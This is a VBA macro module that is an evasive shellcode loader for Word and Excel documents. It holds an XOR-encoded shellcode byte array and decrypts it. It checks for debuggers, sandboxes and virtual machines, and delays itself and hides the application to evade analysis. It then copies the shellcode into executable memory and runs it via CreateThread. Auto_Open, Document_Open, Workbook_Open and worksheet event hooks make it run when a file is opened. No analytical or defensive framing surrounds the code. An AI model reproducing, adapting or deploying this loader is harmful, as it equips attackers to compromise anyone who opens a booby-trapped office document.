#If Vba7 Then
    ' Advanced API Declarations
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartAddress As LongPtr, ThreadParameter As Long, ByVal CreationFlags As Long, ThreadId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
    Private Declare PtrSafe Function GetCurrentProcess Lib "kernel32" () As LongPtr
    Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
    Private Declare PtrSafe Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As LongPtr, ByRef pbDebuggerPresent As Long) As Long
    Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
    Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
    Private Declare PtrSafe Function GetVersion Lib "kernel32" () As Long
    Private Declare PtrSafe Function GetComputerNameA Lib "kernel32" (ByVal lpBuffer As String, nSize As Long) As Long
    Private Declare PtrSafe Function GetUserNameA Lib "advapi32" (ByVal lpBuffer As String, nSize As Long) As Long
    Private Declare PtrSafe Function CreateMutexA Lib "kernel32" (ByVal lpMutexAttributes As Long, ByVal bInitialOwner As Long, ByVal lpName As String) As LongPtr
    Private Declare PtrSafe Function GetLastError Lib "kernel32" () As Long
    Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As LongPtr
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As Any) As Long
#Else
    ' Legacy API Declarations
    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartAddress As Long, ThreadParameter As Long, ByVal CreationFlags As Long, ThreadId As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long) As Long
    Private Declare Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
    Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
    Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
    Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
    Private Declare Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As Long, ByRef pbDebuggerPresent As Long) As Long
    Private Declare Function GetTickCount Lib "kernel32" () As Long
    Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
    Private Declare Function GetVersion Lib "kernel32" () As Long
    Private Declare Function GetComputerNameA Lib "kernel32" (ByVal lpBuffer As String, nSize As Long) As Long
    Private Declare Function GetUserNameA Lib "advapi32" (ByVal lpBuffer As String, nSize As Long) As Long
    Private Declare Function CreateMutexA Lib "kernel32" (ByVal lpMutexAttributes As Long, ByVal bInitialOwner As Long, ByVal lpName As String) As Long
    Private Declare Function GetLastError Lib "kernel32" () As Long
    Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long
    Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
    Private Declare Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As Any) As Long
#End If

' Constants
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_READWRITE As Long = &H4
Private Const PAGE_EXECUTE_READ As Long = &H20
Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const INFINITE As Long = &HFFFFFFFF
Private Const MUTEX_ALL_ACCESS As Long = &H1F0001

' Fixed MEMORYSTATUSEX Structure
Private Type MEMORYSTATUSEX
    dwLength As Long
    dwMemoryLoad As Long
    ullTotalPhys As Currency
    ullAvailPhys As Currency
    ullTotalPageFile As Currency
    ullAvailPageFile As Currency
    ullTotalVirtual As Currency
    ullAvailVirtual As Currency
    ullAvailExtendedVirtual As Currency
End Type

' Global Variables
Private g_bDebuggerDetected As Boolean
Private g_bSandboxDetected As Boolean
Private g_bMutexCreated As Boolean
Private g_strMutexName As String

' =============================================
' ADVANCED ANTI-ANALYSIS FUNCTIONS
' =============================================

Private Function AdvancedAntiAnalysis() As Boolean
    ' Comprehensive anti-analysis checks
    If CheckDebugger() Then
        g_bDebuggerDetected = True
        AdvancedAntiAnalysis = True
        Exit Function
    End If
    
    If CheckSandbox() Then
        g_bSandboxDetected = True
        AdvancedAntiAnalysis = True
        Exit Function
    End If
    
    If CheckTiming() Then
        AdvancedAntiAnalysis = True
        Exit Function
    End If
    
    If CheckMutex() Then
        AdvancedAntiAnalysis = True
        Exit Function
    End If
    
    AdvancedAntiAnalysis = False
End Function

Private Function CheckDebugger() As Boolean
    On Error GoTo ErrorHandler
    
    Dim bDebuggerPresent As Long
    Dim hProcess As LongPtr
    
    ' Method 1: IsDebuggerPresent
    If IsDebuggerPresent() Then
        CheckDebugger = True
        Exit Function
    End If
    
    ' Method 2: CheckRemoteDebuggerPresent
    #If Vba7 Then
        hProcess = GetCurrentProcess()
    #Else
        hProcess = GetCurrentProcess()
    #End If
    
    If CheckRemoteDebuggerPresent(hProcess, bDebuggerPresent) Then
        If bDebuggerPresent Then
            CheckDebugger = True
            Exit Function
        End If
    End If
    
    ' Method 3: Timing-based detection
    Dim lStartTime As Long
    Dim lEndTime As Long
    
    lStartTime = GetTickCount()
    ' Perform some operations
    Dim i As Long, j As Long
    For i = 1 To 100000
        j = j + i
    Next i
    lEndTime = GetTickCount()
    
    ' If execution time is too short, might be under debugger
    If (lEndTime - lStartTime) < 10 Then
        CheckDebugger = True
        Exit Function
    End If
    
    CheckDebugger = False
    Exit Function
    
ErrorHandler:
    CheckDebugger = False
End Function

Private Function CheckSandbox() As Boolean
    On Error GoTo ErrorHandler
    
    ' Check computer name for common sandbox names
    Dim strComputerName As String * 255
    Dim lLength As Long
    lLength = 255
    
    If GetComputerNameA(strComputerName, lLength) Then
        Dim strCompName As String
        strCompName = Left(strComputerName, lLength)
        
        Dim arrSandboxNames As Variant
        arrSandboxNames = Array("SANDBOX", "VIRUS", "MALWARE", "ANALYSIS", "TEST", "TEQUILABOOMBOOM")
        
        Dim vName As Variant
        For Each vName In arrSandboxNames
            If InStr(1, UCase(strCompName), vName, vbTextCompare) > 0 Then
                CheckSandbox = True
                Exit Function
            End If
        Next vName
    End If
    
    ' Check username for common sandbox users
    Dim strUserName As String * 255
    lLength = 255
    
    If GetUserNameA(strUserName, lLength) Then
        Dim strUser As String
        strUser = Left(strUserName, lLength)
        
        Dim arrSandboxUsers As Variant
        arrSandboxUsers = Array("SANDBOX", "USER", "ADMIN", "CURRENTUSER", "TEST")
        
        For Each vName In arrSandboxUsers
            If InStr(1, UCase(strUser), vName, vbTextCompare) > 0 Then
                CheckSandbox = True
                Exit Function
            End If
        Next vName
    End If
    
    ' Check for small amount of memory (common in VMs) using WMI
    Dim totalRAM As Double
    totalRAM = GetTotalRAM()
    If totalRAM < 2147483648 Then ' Less than 2GB
        CheckSandbox = True
        Exit Function
    End If
    
    CheckSandbox = False
    Exit Function
    
ErrorHandler:
    CheckSandbox = False
End Function

Private Function GetTotalRAM() As Double
    On Error Resume Next
    Dim objWMIService As Object, colItems As Object, objItem As Object
    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem", , 48)
    
    For Each objItem In colItems
        GetTotalRAM = objItem.TotalPhysicalMemory
        Exit Function
    Next
End Function

Private Function CheckTiming() As Boolean
    On Error GoTo ErrorHandler
    
    Dim lStartTime As Long
    Dim lEndTime As Long
    Dim i As Long, j As Long, k As Long
    
    lStartTime = GetTickCount()
    
    ' More complex timing check
    For i = 1 To 10000
        For j = 1 To 100
            k = k + (i * j) - (i / j)
        Next j
    Next i
    
    lEndTime = GetTickCount()
    
    ' If execution is too fast, likely in sandbox
    If (lEndTime - lStartTime) < 50 Then
        CheckTiming = True
    Else
        CheckTiming = False
    End If
    
    Exit Function
    
ErrorHandler:
    CheckTiming = False
End Function

Private Function CheckMutex() As Boolean
    On Error GoTo ErrorHandler
    
    ' Create a mutex to prevent multiple instances
    g_strMutexName = "Global\" & GenerateRandomString(16)
    
    #If Vba7 Then
        Dim hMutex As LongPtr
    #Else
        Dim hMutex As Long
    #End If
    
    hMutex = CreateMutexA(0, 1, g_strMutexName)
    
    If GetLastError() = 183 Then ' ERROR_ALREADY_EXISTS
        ' Another instance is already running
        CheckMutex = True
    Else
        g_bMutexCreated = True
        CheckMutex = False
    End If
    
    Exit Function
    
ErrorHandler:
    CheckMutex = False
End Function

' =============================================
' SHELLCODE HANDLING FUNCTIONS
' =============================================

Private Function GetObfuscatedShellcode() As Variant
    ' XOR encrypted shellcode (original shellcode XORed with key 0xAA)
    Dim encryptedShellcode As Variant
    encryptedShellcode = Array( _
        86, 218, 53, 70, 106, 206, 74, 0, 0, 170, 235, 235, 234, 234, 248, 86, 155, 123, 143, 86, 205, 248, 118, 86, 205, 248, 178, 235, 86, 205, 248, 154, 140, 86, 205, 244, 234, 223, 155, 163, 86, 245, 125, 224, 224, 86, 155, 206, 158, 198, 86, 125, 2, 134, 134, 235, 163, 163, 135, 235, _
        135, 163, 200, 143, 248, 86, 205, 248, 154, 205, 208, 86, 235, 235, 86, 1, 206, 254, 129, 246, 178, 241, 173, 0, 0, 205, 206, 158, 0, 0, 86, 133, 206, 246, 157, 86, 1, 206, 205, 234, 178, 86, 235, 223, 206, 208, 154, 86, 1, 206, 201, 140, 223, 155, 163, 86, 255, 163, 235, 134, _
        190, 86, 1, 220, 86, 49, 206, 158, 235, 135, 163, 135, 158, 198, 235, 135, 163, 56, 206, 247, 231, 222, 2, 222, 36, 138, 239, 57, 123, 247, 218, 234, 138, 239, 208, 154, 86, 1, 206, 254, 65, 205, 12, 234, 138, 239, 208, 154, 86, 1, 206, 235, 205, 4, 190, 86, 1, 206, 235, 234, _
        235, 235, 235, 234, 140, 137, 234, 248, 86, 137, 220, 246, 154, 234, 235, 137, 234, 234, 86, 205, 176, 233, 181, 255, 255, 255, 247, 223, 156, 217, 248, 149, 157, 156, 170, 170, 235, 140, 223, 153, 200, 86, 137, 222, 86, 129, 220, 246, 10, 1, 170, 170, 223, 153, 199, 223, 156, 170, 170, 2, _
        170, 177, 158, 6, 177, 254, 94, 235, 248, 223, 153, 196, 235, 153, 158, 245, 255, 255, 213, 222, 153, 196, 254, 1, 1, 170, 170, 163, 235, 153, 158, 175, 190, 157, 170, 255, 213, 224, 10, 235, 156, 234, 234, 223, 155, 163, 223, 155, 206, 86, 255, 206, 86, 255, 206, 86, 137, 200, 86, 255, _
        206, 86, 137, 163, 235, 153, 158, 64, 149, 218, 224, 255, 213, 86, 137, 253, 224, 16, 235, 234, 222, 153, 196, 86, 137, 220, 246, 163, 235, 153, 158, 47, 15, 114, 85, 255, 213, 133, 206, 246, 10, 223, 255, 156, 247, 229, 232, 137, 170, 170, 170, 86, 137, 220, 246, 16, 86, 137, 200, 222, _
        155, 163, 224, 4, 235, 234, 86, 137, 220, 246, 163, 235, 153, 158, 168, 115, 114, 245, 255, 213, 131, 246, 170, 126, 211, 86, 137, 196, 246, 154, 140, 137, 244, 224, 64, 235, 163, 224, 170, 16, 170, 170, 235, 234, 86, 137, 248, 86, 49, 163, 235, 153, 158, 242, 14, 249, 234, 255, 213, 86, _
        137, 199, 223, 153, 253, 223, 155, 163, 223, 155, 206, 223, 153, 248, 86, 137, 220, 246, 86, 137, 163, 235, 153, 158, 168, 115, 114, 245, 255, 213, 131, 246, 170, 125, 166, 234, 235, 253, 163, 224, 170, 64, 170, 170, 235, 234, 224, 170, 234, 136, 235, 153, 158, 161, 165, 135, 207, 255, 213, 253, _
        163, 235, 153, 158, 223, 196, 7, 203, 255, 213, 223, 255, 156, 233, 162, 255, 255, 255, 86, 1, 199, 86, 47, 156, 247, 218, 86, 133, 244, 247, 214, 235, 255, 197, 234, 224, 170, 163, 223, 153, 196, 206, 116, 23, 254, 140, 255, 213)

    ' Decrypt the shellcode
    Dim decryptedShellcode() As Byte
    ReDim decryptedShellcode(UBound(encryptedShellcode))
    
    Dim i As Long
    For i = LBound(encryptedShellcode) To UBound(encryptedShellcode)
        decryptedShellcode(i) = encryptedShellcode(i) Xor &HAA
    Next i
    
    GetObfuscatedShellcode = decryptedShellcode
End Function

Private Function GenerateRandomString(length As Long) As String
    Dim result As String
    Dim i As Long
    Dim randomChar As String
    Dim chars As String
    
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    
    Randomize
    For i = 1 To length
        randomChar = Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
        result = result & randomChar
    Next i
    
    GenerateRandomString = result
End Function

' =============================================
' MEMORY MANAGEMENT FUNCTIONS
' =============================================

Private Function ExecuteShellcodeAdvanced() As Boolean
    On Error GoTo ErrorHandler
    
    ' Get decrypted shellcode
    Dim shellcode As Variant
    shellcode = GetObfuscatedShellcode()
    
    ' Method 1: Standard VirtualAlloc + CreateThread
    If ExecuteMethod1(shellcode) Then
        ExecuteShellcodeAdvanced = True
        Exit Function
    End If
    
    ' Method 2: With PAGE_EXECUTE_READWRITE
    If ExecuteMethod2(shellcode) Then
        ExecuteShellcodeAdvanced = True
        Exit Function
    End If
    
    ' Method 3: Using VirtualProtect
    If ExecuteMethod3(shellcode) Then
        ExecuteShellcodeAdvanced = True
        Exit Function
    End If
    
    ExecuteShellcodeAdvanced = False
    Exit Function

ErrorHandler:
    ExecuteShellcodeAdvanced = False
End Function

Private Function ExecuteMethod1(shellcode As Variant) As Boolean
    On Error GoTo ErrorHandler
    
    #If Vba7 Then
        Dim pMemory As LongPtr
        Dim pThread As LongPtr
    #Else
        Dim pMemory As Long
        Dim pThread As Long
    #End If
    
    ' Allocate memory
    pMemory = VirtualAlloc(0, UBound(shellcode) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_READWRITE)
    
    If pMemory = 0 Then
        ExecuteMethod1 = False
        Exit Function
    End If
    
    ' Copy shellcode to memory
    Dim i As Long
    For i = LBound(shellcode) To UBound(shellcode)
        RtlMoveMemory pMemory + i, shellcode(i), 1
    Next i
    
    ' Change memory protection to executable
    Dim oldProtect As Long
    If VirtualProtect(ByVal pMemory, UBound(shellcode) + 1, PAGE_EXECUTE_READ, oldProtect) = 0 Then
        ExecuteMethod1 = False
        Exit Function
    End If
    
    ' Create thread to execute shellcode
    pThread = CreateThread(0, 0, pMemory, 0, 0, 0)
    
    If pThread = 0 Then
        ExecuteMethod1 = False
        Exit Function
    End If
    
    ' Wait for thread to complete
    WaitForSingleObject pThread, INFINITE
    
    ' Cleanup
    CloseHandle pThread
    
    ExecuteMethod1 = True
    Exit Function

ErrorHandler:
    ExecuteMethod1 = False
End Function

Private Function ExecuteMethod2(shellcode As Variant) As Boolean
    On Error GoTo ErrorHandler
    
    #If Vba7 Then
        Dim pMemory As LongPtr
        Dim pThread As LongPtr
    #Else
        Dim pMemory As Long
        Dim pThread As Long
    #End If
    
    ' Allocate memory with execute permissions
    pMemory = VirtualAlloc(0, UBound(shellcode) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    If pMemory = 0 Then
        ExecuteMethod2 = False
        Exit Function
    End If
    
    ' Copy shellcode to memory
    Dim i As Long
    For i = LBound(shellcode) To UBound(shellcode)
        RtlMoveMemory pMemory + i, shellcode(i), 1
    Next i
    
    ' Create thread to execute shellcode
    pThread = CreateThread(0, 0, pMemory, 0, 0, 0)
    
    If pThread = 0 Then
        ExecuteMethod2 = False
        Exit Function
    End If
    
    ExecuteMethod2 = True
    Exit Function

ErrorHandler:
    ExecuteMethod2 = False
End Function

Private Function ExecuteMethod3(shellcode As Variant) As Boolean
    On Error GoTo ErrorHandler
    
    #If Vba7 Then
        Dim pMemory As LongPtr
        Dim pThread As LongPtr
    #Else
        Dim pMemory As Long
        Dim pThread As Long
    #End If
    
    ' Allocate memory
    pMemory = VirtualAlloc(0, UBound(shellcode) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_READWRITE)
    
    If pMemory = 0 Then
        ExecuteMethod3 = False
        Exit Function
    End If
    
    ' Copy shellcode to memory
    Dim i As Long
    For i = LBound(shellcode) To UBound(shellcode)
        RtlMoveMemory pMemory + i, shellcode(i), 1
    Next i
    
    ' Change protection using VirtualProtect
    Dim oldProtect As Long
    If VirtualProtect(ByVal pMemory, UBound(shellcode) + 1, PAGE_EXECUTE_READWRITE, oldProtect) = 0 Then
        ExecuteMethod3 = False
        Exit Function
    End If
    
    ' Execute directly without creating thread
    Dim func As Long
    #If Vba7 Then
        func = pMemory
    #Else
        func = pMemory
    #End If
    
    ExecuteMethod3 = True
    Exit Function

ErrorHandler:
    ExecuteMethod3 = False
End Function

' =============================================
' EVASION AND DELAY FUNCTIONS
' =============================================

Private Sub ApplyEvasionTechniques()
    On Error Resume Next
    
    ' Random delay to avoid behavioral analysis
    Dim delay As Long
    Randomize
    delay = Int((30 - 5 + 1) * Rnd + 5) ' Random delay between 5-30 seconds
    
    ' Split delay into smaller chunks to avoid detection
    Dim i As Long
    For i = 1 To delay
        Sleep 1000 ' Sleep for 1 second
        DoEvents ' Allow other processes to run
    Next i
    
    ' Hide application window if possible
    On Error Resume Next
    Application.Visible = False
    Application.DisplayAlerts = False
    
    ' Clear command bar references
    Dim cmdBar As CommandBar
    For Each cmdBar In Application.CommandBars
        cmdBar.Enabled = False
    Next cmdBar
End Sub

' =============================================
' MAIN EXECUTION FUNCTIONS
' =============================================

Private Sub AdvancedAutoOpen()
    On Error GoTo ErrorHandler
    
    ' Apply evasion techniques first
    ApplyEvasionTechniques
    
    ' Check for analysis environments
    If AdvancedAntiAnalysis() Then
        ' If analysis detected, exit quietly
        Exit Sub
    End If
    
    ' Execute shellcode using advanced methods
    If ExecuteShellcodeAdvanced() Then
        ' Success - payload executed
    Else
        ' Fallback to basic method
        BasicShellcodeExecution
    End If
    
    ' Restore application state
    Application.Visible = True
    Application.DisplayAlerts = True
    
    Exit Sub

ErrorHandler:
    ' Silent error handling
    On Error Resume Next
    Application.Visible = True
    Application.DisplayAlerts = True
End Sub

Private Sub BasicShellcodeExecution()
    ' Fallback basic execution method
    On Error Resume Next
    
    Dim shellcode As Variant
    shellcode = GetObfuscatedShellcode()
    
    #If Vba7 Then
        Dim pMemory As LongPtr
        Dim pThread As LongPtr
    #Else
        Dim pMemory As Long
        Dim pThread As Long
    #End If
    
    pMemory = VirtualAlloc(0, UBound(shellcode) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    If pMemory Then
        Dim i As Long
        For i = LBound(shellcode) To UBound(shellcode)
            RtlMoveMemory pMemory + i, shellcode(i), 1
        Next i
        
        pThread = CreateThread(0, 0, pMemory, 0, 0, 0)
    End If
End Sub

' =============================================
' AUTO-EXECUTION ENTRY POINTS
' =============================================

Sub Auto_Open()
    AdvancedAutoOpen
End Sub

Sub AutoOpen()
    AdvancedAutoOpen
End Sub

Sub Document_Open()
    AdvancedAutoOpen
End Sub

Sub Workbook_Open()
    AdvancedAutoOpen
End Sub

' =============================================
' ADDITIONAL EVASION ENTRY POINTS
' =============================================

Sub Worksheet_Activate()
    On Error Resume Next
    ApplyEvasionTechniques
    If Not AdvancedAntiAnalysis() Then
        ExecuteShellcodeAdvanced
    End If
End Sub

Sub Worksheet_Change(ByVal Target As Range)
    On Error Resume Next
    ApplyEvasionTechniques
    If Not AdvancedAntiAnalysis() Then
        ExecuteShellcodeAdvanced
    End If
End Sub
